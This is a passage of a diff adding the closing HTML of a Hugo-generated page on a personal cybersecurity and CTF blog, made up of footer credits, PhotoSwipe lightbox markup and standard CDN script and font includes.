+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Antoine Mayol
+    </section>
+    
+    <section class="powerby">
+        
+            Cybersecurity · CTF · Research <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.33.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+    
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.f8f9cc04f1bb5fee265743710a1fb5fe09c46523989adcd1e585c2d71a3d2aaf.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
